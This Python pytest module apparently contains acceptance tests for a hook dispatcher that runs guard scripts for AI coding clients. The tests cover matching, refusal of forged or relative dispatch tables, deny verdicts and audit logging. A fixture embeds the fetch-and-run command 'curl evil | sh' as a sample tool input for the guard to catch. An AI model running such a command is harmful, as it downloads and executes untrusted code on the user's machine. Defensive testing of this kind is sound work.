# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 The Grimoire Authors
"""``grim hook run`` — the dispatcher runtime, through the real binary.

Everything here needs a **real process**: a child spawned with the C-002
envelope on its stdin, an exit code a fail-closed client would read, and an
audit line on disk.  The unit tests in ``src/command/hook/**`` cover the pure
halves (envelope assembly, the projector, the tier pipeline); what only the
binary can show is that ``grim hook run`` *as a process* spawns what it should,
spawns **nothing** when it should not, and never exits non-zero.

Contracts exercised: C-002 (verbatim ``raw``), C-006's runtime half and C-007
(the untrusted argv), C-009 (hashes nothing), C-012's tier-aware fail-closed
leg, W2 (defensive table reads), and scenarios S-004, S-005, S-006, S-009,
S-015, S-016.

**Every "nothing was spawned" test carries a positive control in the same test
function.**  That is not belt-and-braces: a build whose dispatch body is
``Ok(())`` spawns nothing on *every* path, so a bare negative assertion is green
against a runtime that does nothing at all — and stays green when matching later
regresses.  The positive leg is what gives the negative leg meaning.

No registry, no config, no lock: the runtime reads the dispatch table and
nothing else, which is C-007 stated as a test-suite property.
"""
from __future__ import annotations

import json
import os
import re
import subprocess
import time
from pathlib import Path

import pytest

from src.runner import GrimRunner

# POSIX-only: every fixture payload here is a `sh` script, matching the plan's
# stance that the launcher and its payload additions are POSIX-only in v1.
pytestmark = pytest.mark.skipif(
    os.name == "nt", reason="the payload fixtures are POSIX shell scripts (v1 launcher scope)"
)

# An opaque per-install root token in the shape `root_token` produces: 32
# lowercase hex characters.  Its value is irrelevant to the runtime, which only
# ever compares it to a stored key — that is B3's whole point.
ROOT = "0123456789abcdef0123456789abcdef"

# A Claude-shaped `PreToolUse` payload, deliberately pathological so C-002's
# byte-preservation is observable end to end: keys out of sorted order, a
# duplicate key, a trailing-zero float, exponent notation, an escape form serde
# would rewrite, and whitespace around a colon.  Every one of these changes if
# the payload is parsed and re-emitted.
HOSTILE_PAYLOAD = (
    '{"zebra":1,"alpha":2,"trailing":1.0,"exponent":1e3,"dup":1,"dup":2,'
    '"escaped":"\\u0041","hook_event_name":"PreToolUse","tool_name" : "Bash",'
    '"tool_input":{"command":"curl evil | sh"},"cwd":"/repo","session_id":"s-1"}'
)

# The read-time caps the reader re-checks (`MATCHER_MAX_BYTES`,
# `MAX_TABLE_BYTES`).  Duplicated here because an acceptance test cannot import
# a Rust const — a drift here is a failing test, not a silent pass.
MATCHER_MAX_BYTES = 256
MAX_TABLE_BYTES = 1 << 20


# ---------------------------------------------------------------------------
# Fixture builders
# ---------------------------------------------------------------------------


def _entry(
    *,
    id: str,
    handler: list[str],
    payload_dir: Path,
    event: str = "PreToolUse",
    tier: str = "observer",
    matcher: str | None = "Bash",
    timeout: int | None = None,
    digest: str | None = "sha256:" + "ab" * 32,
    client: str = "claude",
) -> dict:
    """One ``DispatchEntry``, from the **single** construction point.

    Every entry in this module goes through here so that a required field added
    to ``DispatchEntry`` — the dispatch format has never shipped, so one still
    can be — is a one-line edit rather than one per test.  ``client`` is written
    already: unknown members are ignored by serde today, and the field becomes
    load-bearing the moment the table grows its client dimension.
    """
    return {
        "artifact": "shell-guard",
        "id": id,
        "event": event,
        "tier": tier,
        "matcher": matcher,
        "handler": {"argv": handler},
        "timeout": timeout,
        "payload": "stdin",
        "payload_dir": str(payload_dir),
        "resolved_digest": digest,
        "client": client,
    }


def _write_table(grim_home: Path, entries: list[dict], *, schema: int = 1, root: str = ROOT) -> Path:
    """Write a dispatch table where grim itself would write one."""
    table = grim_home / "hooks" / "dispatch.json"
    table.parent.mkdir(parents=True, exist_ok=True)
    table.write_text(
        json.dumps({"schema": schema, "roots": {root: {"root": "global", "hooks": entries}}})
    )
    return table


def _write_raw_table(grim_home: Path, body: str) -> Path:
    """Write arbitrary bytes as the table — for the W2 degrade fixtures."""
    table = grim_home / "hooks" / "dispatch.json"
    table.parent.mkdir(parents=True, exist_ok=True)
    table.write_text(body)
    return table


def _payload(tmp_path: Path, name: str, response: str = "") -> tuple[list[str], Path, Path]:
    """A recording payload script.

    Returns ``(handler_argv, marker, payload_dir)``.  The script writes whatever
    it was handed on stdin to ``marker`` and then answers with ``response``, so
    the marker's **existence** proves the payload ran and its **contents** are
    the envelope grim built.  Absent marker, absent spawn — which is the only
    honest form of a "nothing was spawned" assertion.
    """
    payload_dir = tmp_path / "payloads" / name
    payload_dir.mkdir(parents=True, exist_ok=True)
    marker = tmp_path / f"{name}.marker"
    script = payload_dir / "guard.sh"
    script.write_text(f"#!/bin/sh\ncat > '{marker}'\nprintf '%s' '{response}'\n")
    return ["sh", str(script)], marker, payload_dir


def _hook_run(
    grim: GrimRunner,
    table: Path | str,
    *,
    client: str = "claude",
    event: str = "PreToolUse",
    root: str = ROOT,
    stdin: str = HOSTILE_PAYLOAD,
    cwd: Path | None = None,
) -> subprocess.CompletedProcess[str]:
    """Invoke the runtime exactly as a generated launcher would.

    ``check=False`` always: the assertion under test is usually the exit code
    itself, and this command's contract is that the code is **0** on every path
    grim controls.
    """
    runner = GrimRunner(grim.binary, grim.grim_home, cwd=cwd) if cwd else grim
    return runner.run(
        "hook",
        "run",
        "--client",
        client,
        "--event",
        event,
        "--table",
        str(table),
        "--root",
        root,
        stdin=stdin,
        check=False,
    )


def _audit_trail(grim_home: Path) -> Path:
    """The audit trail: the dispatch table's **sibling**.

    Settled after the WP-K stub phase, which implemented the ADR's
    ``<data root>/state/hook_audit.jsonl`` and recorded the gap as F-2.  The
    trail lives inside the same ``0o700`` hooks directory as the table because
    ``--table`` is the only path the runtime receives, and climbing two levels to
    the data root would reconstruct exactly the ``$GRIM_HOME`` authority
    ``--table`` exists to withhold.

    Pinned to the one location rather than globbed: if the implementation writes
    under ``state/`` instead, the audit-blocking helper below no longer blocks
    anything and the C-012 tests fail — which is the report a wrong location
    deserves.
    """
    return grim_home / "hooks" / "hook_audit.jsonl"


def _audit_records(grim_home: Path) -> list[dict]:
    """Every audit record written for this invocation."""
    trail = _audit_trail(grim_home)
    if not trail.is_file():
        return []
    return [json.loads(line) for line in trail.read_text().splitlines() if line.strip()]


def _block_the_audit_write(grim_home: Path) -> None:
    """Make the audit append fail.

    A **directory** where the file belongs, not a mode change: ``open(…,
    append)`` fails with ``EISDIR`` for every uid, where mode bits are bypassed
    by root — and acceptance tests do run as root in some containers.

    The existing trail is removed first, because every caller runs its positive
    control **before** blocking the write and that control legitimately creates
    the file — ``mkdir(exist_ok=True)`` tolerates an existing *directory*, not an
    existing file, so without the unlink this helper raised instead of blocking.
    Still exactly one path, still not globbed: an implementation that writes its
    trail somewhere else is blocked by nothing here, and its C-012 tests fail —
    which is the report a wrong location deserves.
    """
    trail = _audit_trail(grim_home)
    trail.parent.mkdir(parents=True, exist_ok=True)
    if trail.is_file():
        trail.unlink()
    trail.mkdir(exist_ok=True)


# ---------------------------------------------------------------------------
# S-005 / C-002 — the matched path
# ---------------------------------------------------------------------------


def test_a_matched_hook_spawns_the_payload_with_the_envelope_on_stdin(grim, grim_home, tmp_path):
    """S-005 + C-002 end to end, and the positive control every other test cites.

    The envelope's own fields are asserted here rather than in the unit tests
    because only the real runtime holds them: ``compose``'s signature receives no
    client, scope or hook identity (reported as a finding), so a unit test cannot
    ask for a complete envelope.
    """
    handler, marker, payload_dir = _payload(tmp_path, "hit")
    table = _write_table(grim_home, [_entry(id="hit", handler=handler, payload_dir=payload_dir)])

    result = _hook_run(grim, table)

    assert result.returncode == 0, result.stderr
    assert marker.exists(), f"the matched payload was never spawned\nstderr: {result.stderr}"
    received = marker.read_text()

    # C-002: the client's bytes, verbatim, as the value of `raw`.
    assert HOSTILE_PAYLOAD in received, (
        "the client's payload was re-encoded on the way into `raw`; C-002 requires the exact "
        f"bytes\nreceived: {received}"
    )
    assert re.search(r'"raw"\s*:', received), f"no `raw` member at all: {received}"

    envelope = json.loads(received)
    assert envelope["schema"] == 1
    assert envelope["event"] == "PreToolUse"
    assert envelope["native_event"] == "PreToolUse"
    assert envelope["client"] == "claude"
    assert envelope["scope"] == "global", "the table's root is `global`"
    assert envelope["hook"] == "shell-guard/hit", "`<artifact>/<id>` — the audit trail's identity"
    assert envelope["tier"] == "observer"
    assert envelope["cwd"] == "/repo", "the cwd the CLIENT reported, never the process cwd"
    assert envelope["session_id"] == "s-1"
    assert envelope["tool"]["name"] == "Bash"
    assert envelope["tool"]["input"]["command"] == "curl evil | sh"

    # G-1: the correlation id must actually JOIN, which a truthiness check
    # cannot show. Both fields are documented as the join key, and both were
    # independently well-formed while holding *different* values — the envelope
    # carried a pid/instant id and `AuditRecord::new` derived its own short
    # digest, because the record cannot exist until the payload has answered.
    # A field a reader trusts to join and which silently does not is worse than
    # an absent one, so this asserts the equality rather than the presence.
    records = _audit_records(grim_home)
    assert records, f"no audit record was written\nstderr: {result.stderr}"
    assert envelope["correlation_id"], "records of one invocation must be joinable"
    assert records[0]["correlation_id"] == envelope["correlation_id"], (
        "the audit record and the envelope must carry the SAME join key; two well-formed but "
        f"different ids do not join\nenvelope: {envelope['correlation_id']}\n"
        f"record:   {records[0]['correlation_id']}"
    )


def test_the_payload_runs_from_its_payload_dir(grim, grim_home, tmp_path):
    """The handler resolves against the materialized payload tree.

    A relative handler is the whole point of ``payload_dir``: a payload has to be
    able to find its own siblings.  Asserted with a relative ``argv[0]`` target,
    which only resolves if the child's working directory is the payload tree.
    """
    _, marker, payload_dir = _payload(tmp_path, "cwd")
    table = _write_table(
        grim_home,
        [_entry(id="cwd", handler=["sh", "guard.sh"], payload_dir=payload_dir)],
    )

    result = _hook_run(grim, table)

    assert result.returncode == 0, result.stderr
    assert marker.exists(), (
        "a relative handler did not resolve, so the payload was not run from its payload_dir"
        f"\nstderr: {result.stderr}"
    )


# ---------------------------------------------------------------------------
# S-004 — the no-match path, with its positive control
# ---------------------------------------------------------------------------


def test_a_matcher_that_does_not_match_spawns_nothing_s004(grim, grim_home, tmp_path):
    """S-004: a non-matching matcher spawns nothing and computes no hash.

    Both legs run against **one** table so the negative cannot pass for the
    wrong reason: if the positive leg does not spawn, this build spawns nothing
    at all and the negative leg proves nothing (the stub report's F-7).
    """
    handler, marker, payload_dir = _payload(tmp_path, "guard")
    table = _write_table(
        grim_home, [_entry(id="guard", handler=handler, payload_dir=payload_dir, matcher="Bash")]
    )
    other_tool = HOSTILE_PAYLOAD.replace('"tool_name" : "Bash"', '"tool_name":"Read"')

    miss = _hook_run(grim, table, stdin=other_tool)
    assert miss.returncode == 0, miss.stderr
    assert not marker.exists(), "a matcher of `Bash` must not fire for tool `Read`"

    hit = _hook_run(grim, table)
    assert hit.returncode == 0, hit.stderr
    assert marker.exists(), (
        "POSITIVE CONTROL FAILED: this build spawns nothing at all, so the negative leg above "
        f"is vacuous\nstderr: {hit.stderr}"
    )


def test_an_alternation_matcher_fires_on_every_alternative(grim, grim_home, tmp_path):
    """An ``A|B`` matcher fires for A, for B, and for nothing else.

    Round 1 of review found this arming everywhere and firing on nothing.
    ``MATCHER_ALLOWED`` admits ``|`` and ``classify_matcher`` calls ``A|B`` one of
    the three losslessly translatable forms, so the *client's* matcher already
    fires on either name and the hook registers and gets a dispatch row — but
    grim's own pass compared the whole ``"Bash|Read"`` string to the tool name, so
    no tool could ever match it.  Both ``grim status`` and ``grim hook list``
    reported it armed, which is why it needs an acceptance test and not only a
    unit one: the arming surfaces agreed with each other and disagreed with
    reality.

    All three legs run against **one** table, and the two positives are each
    other's control: a build that spawns nothing at all fails them before the
    negative leg can pass vacuously.
    """
    handler, marker, payload_dir = _payload(tmp_path, "guard")
    table = _write_table(
        grim_home,
        [_entry(id="guard", handler=handler, payload_dir=payload_dir, matcher="Bash|Read")],
    )

    def _run_for(tool: str):
        marker.unlink(missing_ok=True)
        payload = HOSTILE_PAYLOAD.replace('"tool_name" : "Bash"', f'"tool_name":"{tool}"')
        result = _hook_run(grim, table, stdin=payload)
        assert result.returncode == 0, result.stderr
        return marker.exists(), result

    for alternative in ("Bash", "Read"):
        fired, result = _run_for(alternative)
        assert fired, (
            f"the matcher `Bash|Read` did not fire for tool `{alternative}`; an alternation that "
            f"arms everywhere and matches nothing is the round-1 defect\nstderr: {result.stderr}"
        )

    fired, result = _run_for("Write")
    assert not fired, (
        "`Bash|Read` fired for tool `Write` — splitting on `|` must narrow to the named "
        f"alternatives, never widen to every tool\nstderr: {result.stderr}"
    )


def test_the_documented_payload_dir_token_runs_the_payload(grim, grim_home, tmp_path):
    """``argv = ["sh", "${GRIM_HOOK_DIR}/guard.sh"]`` — the preferred form — runs.

    Round 1 of review found this dead: ``argv`` is exec form, so no shell expands
    the token, and ``sh`` opened a file literally named ``${GRIM_HOOK_DIR}/…``.
    The *lesser* ``command`` form worked, because ``sh -c`` expands from the
    environment.  ``grim build`` recommends this exact shape in its refusal
    message for a payload-relative ``argv[0]``, so grim's own advice produced a
    hook that armed and then failed to run.

    Both spellings are asserted, and the braceless one is the form
    ``payload_relative_file`` also strips at build time.
    """
    _, marker, payload_dir = _payload(tmp_path, "guard")

    for token in ("${GRIM_HOOK_DIR}/guard.sh", "$GRIM_HOOK_DIR/guard.sh"):
        marker.unlink(missing_ok=True)
        table = _write_table(
            grim_home,
            [_entry(id="guard", handler=["sh", token], payload_dir=payload_dir)],
        )
        result = _hook_run(grim, table)
        assert result.returncode == 0, result.stderr
        assert marker.exists(), (
            f"the handler `sh {token}` did not run the payload; grim must expand the token "
            f"itself because argv is exec form and no shell will\nstderr: {result.stderr}"
        )


# ---------------------------------------------------------------------------
# C-007 / B1 / B3 — the untrusted argv
# ---------------------------------------------------------------------------


def test_a_non_absolute_table_reads_nothing_and_spawns_nothing_c007_b1(grim, grim_home, tmp_path):
    """B1: a relative ``--table`` resolves against the process cwd, which for a
    client-spawned run **is the workspace** — so a hostile repository could ship
    its own table.  Refused, nothing read, exit 0.

    The cwd is set to the directory that actually holds the table, so the
    relative path *would* resolve if it were honoured.  Without that, the test
    would pass merely because the file was missing.
    """
    handler, marker, payload_dir = _payload(tmp_path, "relative")
    table = _write_table(
        grim_home, [_entry(id="relative", handler=handler, payload_dir=payload_dir)]
    )

    refused = _hook_run(grim, "dispatch.json", cwd=table.parent)
    assert refused.returncode == 0, refused.stderr
    assert not marker.exists(), (
        "a relative --table was honoured; a repo that ships its own dispatch.json then chooses "
        "what runs (B1 · T3 · CWE-426)"
    )
    assert "absolute" in refused.stderr, f"the refusal must say why: {refused.stderr}"

    allowed = _hook_run(grim, table)
    assert allowed.returncode == 0, allowed.stderr
    assert marker.exists(), (
        f"POSITIVE CONTROL FAILED: the same table is not honoured absolutely either\n"
        f"stderr: {allowed.stderr}"
    )


def test_an_unknown_root_token_spawns_nothing_c007_b3(grim, grim_home, tmp_path):
    """B3, the forged-registration case: a hostile repo can commit its own client
    registration naming the victim's real launcher, with a root of its choosing.
    An unknown token matches no root, which is the same outcome as an absent one.
    """
    handler, marker, payload_dir = _payload(tmp_path, "forged")
    table = _write_table(grim_home, [_entry(id="forged", handler=handler, payload_dir=payload_dir)])

    for forged in ("global", "ffffffffffffffffffffffffffffffff", str(tmp_path)):
        result = _hook_run(grim, table, root=forged)
        assert result.returncode == 0, result.stderr
        assert not marker.exists(), f"root token {forged!r} fired a hook it does not own"

    real = _hook_run(grim, table, root=ROOT)
    assert real.returncode == 0, real.stderr
    assert marker.exists(), (
        f"POSITIVE CONTROL FAILED: the real token does not fire either\nstderr: {real.stderr}"
    )


def test_a_row_armed_for_another_client_is_never_selected(grim, grim_home, tmp_path):
    """**A row's ``client`` is part of the selection key, and the runtime honours
    it.**

    This is the runtime half of WP-J2's F-1 fix.  ``DispatchEntry.client`` is
    required rather than defaulted because a client-less row would have to mean
    either "matches nothing" or "matches every client", and that ambiguity sits
    in exactly the path deciding whether a **declining** client executes code.
    WP-J2 pins the write side (a row without a client is refused); this is the
    read side, and it is the difference between *grim told the user this hook is
    not armed for codex* and *codex ran it anyway*.

    A hook grim ``Declined`` for one client — an untranslatable matcher per
    C-025, or a tier that client cannot honour — still sits in that root's row
    set, because the table is keyed by root and a root is shared.  Only the
    ``client`` field keeps the declining client out.
    """
    handler, marker, payload_dir = _payload(tmp_path, "claude-only")
    table = _write_table(
        grim_home,
        [_entry(id="claude-only", handler=handler, payload_dir=payload_dir, client="claude")],
    )

    for invoker in ("codex", "copilot"):
        declined = _hook_run(grim, table, client=invoker)
        assert declined.returncode == 0, declined.stderr
        assert not marker.exists(), (
            f"a row armed for `claude` fired for `{invoker}` — that client was told this hook is "
            "not armed there, and it just executed the payload anyway"
        )

    armed = _hook_run(grim, table, client="claude")
    assert armed.returncode == 0, armed.stderr
    assert marker.exists(), (
        f"POSITIVE CONTROL FAILED: the row does not fire for its own client either\n"
        f"stderr: {armed.stderr}"
    )


def test_a_hook_armed_for_two_clients_runs_once_per_invocation(grim, grim_home, tmp_path):
    """One invocation runs the payload **once**, not once per arming client.

    The other half of F-1: a hook armed for claude *and* codex is two rows in one
    root, differing only in ``client``.  Selecting on the event alone would run
    the payload twice for a single tool call — the same payload, the same
    ``payload_dir``, two spawns.

    The payload appends, so the marker's **line count** is the number of spawns.
    A test asserting only "the marker exists" cannot see a double run at all.
    """
    payload_dir = tmp_path / "payloads" / "shared"
    payload_dir.mkdir(parents=True, exist_ok=True)
    marker = tmp_path / "spawns.log"
    script = payload_dir / "guard.sh"
    script.write_text(f"#!/bin/sh\nprintf 'ran\\n' >> '{marker}'\n")
    handler = ["sh", str(script)]

    table = _write_table(
        grim_home,
        [
            _entry(id="shared", handler=handler, payload_dir=payload_dir, client="claude"),
            _entry(id="shared", handler=handler, payload_dir=payload_dir, client="codex"),
        ],
    )

    result = _hook_run(grim, table, client="claude")

    assert result.returncode == 0, result.stderr
    assert marker.exists(), f"POSITIVE CONTROL FAILED: nothing ran at all\nstderr: {result.stderr}"
    spawns = marker.read_text().count("ran")
    assert spawns == 1, (
        f"one tool call spawned the payload {spawns} times — a hook armed for two clients must "
        "run once for the client that invoked it"
    )


def test_an_unknown_event_and_an_empty_client_spawn_nothing_c007(grim, grim_home, tmp_path):
    """Version skew and a malformed launcher: an ``--event`` this grim does not
    know (including one a *newer* grim wrote) and an empty ``--client`` are
    refusals, not errors.
    """
    handler, marker, payload_dir = _payload(tmp_path, "skew")
    table = _write_table(grim_home, [_entry(id="skew", handler=handler, payload_dir=payload_dir)])

    unknown_event = _hook_run(grim, table, event="PermissionRequest")
    assert unknown_event.returncode == 0, unknown_event.stderr
    assert not marker.exists(), "an event this grim does not know must match nothing"

    empty_client = grim.run(
        "hook", "run", "--client", "", "--event", "PreToolUse",
        "--table", str(table), "--root", ROOT,
        stdin=HOSTILE_PAYLOAD, check=False,
    )
    assert empty_client.returncode == 0, empty_client.stderr
    assert not marker.exists(), "an empty client names no projection row"

    control = _hook_run(grim, table)
    assert control.returncode == 0, control.stderr
    assert marker.exists(), f"POSITIVE CONTROL FAILED\nstderr: {control.stderr}"


# ---------------------------------------------------------------------------
# W2 — the defensive table read
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "body,why",
    [
        ('{"schema": 999, "roots": {}}', "a newer schema after a grim downgrade"),
        ('{"schema": 0, "roots": {}}', "a schema this grim never wrote"),
        ('{"schema": "1", "roots": {}}', "a schema of the wrong JSON type"),
        ("{not json at all", "truncated garbage"),
        ("[]", "valid JSON that is not an object"),
        ("", "an empty file"),
        ('{"roots": {}}', "no schema field at all"),
    ],
)
def test_an_unreadable_table_degrades_to_the_empty_table_and_never_panics_w2(
    grim, grim_home, tmp_path, body, why
):
    """W2: any table this grim cannot fully vouch for arms **nothing**, exits 0,
    and never panics.

    ``101`` is the failure this pins as much as a non-zero code is: a panic in a
    released command bypasses every exit-code contract, and on a fail-closed
    client a non-zero hook exit denies the user's own tool call.
    """
    table = _write_raw_table(grim_home, body)

    result = _hook_run(grim, table)

    assert result.returncode == 0, f"{why} must degrade, not fail: rc={result.returncode}"
    assert result.returncode != 101, f"{why} panicked: {result.stderr}"
    assert "panicked" not in result.stderr, f"{why} panicked: {result.stderr}"


def test_a_matcher_over_the_read_time_cap_arms_nothing_w2(grim, grim_home, tmp_path):
    """W2 (c): ``MATCHER_MAX_BYTES`` is re-checked **at read time**, because a
    build-time cap does not bind a file on disk.

    Whole-table, not per-row: the second entry here has a perfectly good matcher
    and must not fire either — "some rows survived" is how a tampered table gets
    a partial verdict honoured.
    """
    long_handler, long_marker, long_dir = _payload(tmp_path, "long")
    ok_handler, ok_marker, ok_dir = _payload(tmp_path, "sibling")
    table = _write_table(
        grim_home,
        [
            _entry(
                id="long",
                handler=long_handler,
                payload_dir=long_dir,
                matcher="B" * (MATCHER_MAX_BYTES + 1),
            ),
            _entry(id="sibling", handler=ok_handler, payload_dir=ok_dir, matcher="Bash"),
        ],
    )

    rejected = _hook_run(grim, table)
    assert rejected.returncode == 0, rejected.stderr
    assert not long_marker.exists(), "an over-cap matcher was honoured"
    assert not ok_marker.exists(), (
        "a sibling row fired from a table grim could not fully vouch for; the reader's verdict "
        "is whole-table by design"
    )

    _write_table(
        grim_home,
        [
            _entry(id="long", handler=long_handler, payload_dir=long_dir, matcher="Bash"),
            _entry(id="sibling", handler=ok_handler, payload_dir=ok_dir, matcher="Bash"),
        ],
    )
    control = _hook_run(grim, table)
    assert control.returncode == 0, control.stderr
    assert long_marker.exists() and ok_marker.exists(), (
        f"POSITIVE CONTROL FAILED: neither row fires even within the cap\nstderr: {control.stderr}"
    )


def test_a_relative_payload_dir_arms_nothing_w2(grim, grim_home, tmp_path):
    """W2 (c): a row whose ``payload_dir`` is relative is rejected at read time —
    a relative payload tree resolves against the process cwd, which is the
    workspace.
    """
    handler, marker, payload_dir = _payload(tmp_path, "relpayload")
    table = _write_table(grim_home, [_entry(id="relpayload", handler=handler, payload_dir=Path("payloads"))])

    rejected = _hook_run(grim, table)
    assert rejected.returncode == 0, rejected.stderr
    assert not marker.exists(), "a relative payload_dir was honoured"

    _write_table(grim_home, [_entry(id="relpayload", handler=handler, payload_dir=payload_dir)])
    control = _hook_run(grim, table)
    assert control.returncode == 0, control.stderr
    assert marker.exists(), f"POSITIVE CONTROL FAILED\nstderr: {control.stderr}"


def test_an_oversize_table_arms_nothing_w2(grim, grim_home, tmp_path):
    """W2 (c): the size cap is applied **before** the read — a cap applied after
    reading the file is not a cap.
    """
    handler, marker, payload_dir = _payload(tmp_path, "oversize")
    entry = _entry(id="oversize", handler=handler, payload_dir=payload_dir)
    entry["padding"] = "x" * (MAX_TABLE_BYTES + 1)
    table = _write_raw_table(
        grim_home, json.dumps({"schema": 1, "roots": {ROOT: {"root": "global", "hooks": [entry]}}})
    )
    assert table.stat().st_size > MAX_TABLE_BYTES, "fixture must exceed the cap"

    rejected = _hook_run(grim, table)
    assert rejected.returncode == 0, rejected.stderr
    assert not marker.exists(), "an over-cap table was read"

    _write_table(grim_home, [_entry(id="oversize", handler=handler, payload_dir=payload_dir)])
    control = _hook_run(grim, table)
    assert control.returncode == 0, control.stderr
    assert marker.exists(), f"POSITIVE CONTROL FAILED\nstderr: {control.stderr}"


# ---------------------------------------------------------------------------
# S-006 / S-009 / S-016 — verdicts on the wire
# ---------------------------------------------------------------------------


def test_a_gatekeeper_deny_reaches_the_client_as_json_never_an_exit_code_s006(
    grim, grim_home, tmp_path
):
    """S-006: a denial travels as a JSON document on stdout.

    Never as an exit code — and specifically never as **2**, which is Claude's
    own deny code.  ``VERDICT_EXIT_CODES`` is empty for all three v1 clients for
    exactly this reason: grim's process-level codes and a hook's verdict must not
    share a channel, or an internal error becomes a denial.
    """
    response = '{"decision":"deny","reason":"piping curl into sh"}'
    handler, marker, payload_dir = _payload(tmp_path, "deny", response=response)
    table = _write_table(
        grim_home,
        [_entry(id="deny", handler=handler, payload_dir=payload_dir, tier="gatekeeper")],
    )

    result = _hook_run(grim, table)

    assert marker.exists(), f"the gatekeeper never ran\nstderr: {result.stderr}"
    assert result.returncode == 0, f"a verdict must not travel as an exit code: {result.returncode}"
    document = json.loads(result.stdout)
    verdict = document["hookSpecificOutput"]["permissionDecision"]
    assert verdict, f"claude/PreToolUse carries its verdict there: {document}"
    assert document["hookSpecificOutput"]["permissionDecisionReason"] == "piping curl into sh"
    assert document["hookSpecificOutput"]["hookEventName"] == "PreToolUse"


def test_a_payload_that_cannot_be_spawned_never_blocks_s009(grim, grim_home, tmp_path):
    """S-009: grim absent or mid-upgrade ⇒ the hook silently does not fire and
    **no client blocks**.

    The launcher's shell guard owns the "grim is absent" half; the runtime owns
    this one — a handler that cannot be executed at all.  It must degrade to no
    opinion, not to a denial, because Copilot's ``preToolUse`` treats any
    non-zero exit as a deny.

    The positive control is a gatekeeper that *can* be spawned and *does* deny:
    without it, "no denial appeared" is satisfied by a runtime that never denies
    anything, which is exactly the state this build is in.
    """
    denier, denier_marker, denier_dir = _payload(
        tmp_path, "denier", response='{"decision":"deny","reason":"blocked"}'
    )
    can_deny = _write_table(
        grim_home,
        [_entry(id="denier", handler=denier, payload_dir=denier_dir, tier="gatekeeper")],
    )
    control = _hook_run(grim, can_deny)
    assert control.returncode == 0, control.stderr
    assert denier_marker.exists(), f"POSITIVE CONTROL FAILED\nstderr: {control.stderr}"
    assert "deny" in control.stdout, (
        f"POSITIVE CONTROL FAILED: this build denies nothing, so the negative leg below is "
        f"vacuous: {control.stdout}"
    )

    _write_table(
        grim_home,
        [
            _entry(
                id="missing",
                handler=["grim-hook-payload-that-does-not-exist"],
                payload_dir=tmp_path,
                tier="gatekeeper",
            )
        ],
    )
    result = _hook_run(grim, can_deny)

    assert result.returncode == 0, f"a failed spawn must not block the user: {result.returncode}"
    assert "deny" not in result.stdout, f"a failed spawn produced a denial: {result.stdout}"


def test_a_mutator_rewrite_is_also_surfaced_to_the_model_s016(grim, grim_home, tmp_path):
    """S-016 (mutator control 5): a rewrite describes itself to the agent.

    No vendor does this by default, which is exactly why it is a grim
    obligation: a silent rewrite is indistinguishable from the model having asked
    for the new command, so the agent's own transcript has to record that its
    input was altered.
    """
    response = '{"decision":"none","updated_input":{"command":"echo safe"}}'
    handler, marker, payload_dir = _payload(tmp_path, "mutate", response=response)
    table = _write_table(
        grim_home,
        [_entry(id="mutate", handler=handler, payload_dir=payload_dir, tier="mutator")],
    )

    result = _hook_run(grim, table)

    assert marker.exists(), f"the mutator never ran\nstderr: {result.stderr}"
    assert result.returncode == 0, result.stderr
    document = json.loads(result.stdout)
    assert document["hookSpecificOutput"]["updatedInput"] == {"command": "echo safe"}
    surfaced = document["hookSpecificOutput"].get("additionalContext") or ""
    assert surfaced.strip(), (
        "the rewrite was applied with nothing said about it — a silent rewrite is what mutator "
        f"control 5 forbids: {document}"
    )


# ---------------------------------------------------------------------------
# C-009 — the runtime hashes nothing
# ---------------------------------------------------------------------------


def test_the_audit_record_copies_the_pinned_digest_and_computes_none_c009(grim, grim_home, tmp_path):
    """C-009: the digest in the audit record is the table's ``resolved_digest``,
    carried verbatim.

    The behavioural half of the source-level guard in ``src/command/hook.rs``:
    a record whose digest is a fresh 64-hex string that the table never held is
    a hash computed on the hot path of every tool call, defending against **N2**
    — a machine already compromised at grim's privilege, an explicit non-goal.
    """
    pinned = "sha256:" + "cd" * 32
    handler, marker, payload_dir = _payload(tmp_path, "provenance")
    table = _write_table(
        grim_home,
        [_entry(id="provenance", handler=handler, payload_dir=payload_dir, digest=pinned)],
    )

    result = _hook_run(grim, table)
    assert marker.exists(), f"the payload never ran\nstderr: {result.stderr}"

    records = _audit_records(grim_home)
    assert records, (
        "C-012 requires an audit record per invocation, and the trail is the table's sibling; "
        f"nothing at {_audit_trail(grim_home)}"
    )
    assert any(r.get("digest") == pinned for r in records), (
        f"the pinned digest was not carried into the trail verbatim: {records}"
    )

    # And with nothing pinned (a path-sourced dev install), the runtime must not
    # invent one.
    #
    # The second entry carries a **different id**, and that is a correction the
    # Implement phase had to make: the trail is append-only, so both halves' records
    # live in one file, and filtering on the id `"provenance"` selected the *pinned*
    # run's record too — the assertion below then failed against a correct
    # implementation.  A distinct id makes the filter isolate what it says it does.
    _write_table(
        grim_home,
        [_entry(id="unpinned", handler=handler, payload_dir=payload_dir, digest=None)],
    )
    marker.unlink()
    _hook_run(grim, table)
    unpinned = [r for r in _audit_records(grim_home) if r.get("hook_id") == "unpinned"]
    assert unpinned, "the unpinned invocation wrote no record"
    for record in unpinned:
        assert not re.fullmatch(r"(sha256:)?[0-9a-f]{64}", record.get("digest") or ""), (
            f"a digest appeared for an entry that pinned none — the runtime hashed something: {record}"
        )


# ---------------------------------------------------------------------------
# C-012 — the tier-aware fail-closed leg
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("tier", ["observer", "gatekeeper"])
def test_an_unwritable_audit_does_not_spawn_an_observer_or_gatekeeper_c012(
    grim, grim_home, tmp_path, tier
):
    """C-012, tiers 1 and 2: the payload is **not spawned**, exit 0, one warning.

    ``gatekeeper`` behaves exactly like ``observer`` here, and that is the
    settled decision rather than an oversight: the gatekeeper tier **is not a
    security boundary** by this design's own declared position, so failing open
    is within the contract.  The invariant is "no **unlogged mutation**", not
    "block when the audit fails".
    """
    handler, marker, payload_dir = _payload(
        tmp_path, f"unlogged-{tier}", response='{"decision":"deny","reason":"blocked"}'
    )
    table = _write_table(
        grim_home, [_entry(id="unlogged", handler=handler, payload_dir=payload_dir, tier=tier)]
    )

    # Positive control FIRST, with the audit writable: proves this fixture fires
    # at all, so the negative below is about the audit failure and not about the
    # build spawning nothing.
    control = _hook_run(grim, table)
    assert control.returncode == 0, control.stderr
    assert marker.exists(), f"POSITIVE CONTROL FAILED\nstderr: {control.stderr}"
    marker.unlink()

    _block_the_audit_write(grim_home)
    result = _hook_run(grim, table)

    assert result.returncode == 0, (
        "grim must NEVER exit non-zero because it could not write its own audit record — on "
        f"Copilot's preToolUse that denies the tool call: rc={result.returncode}"
    )
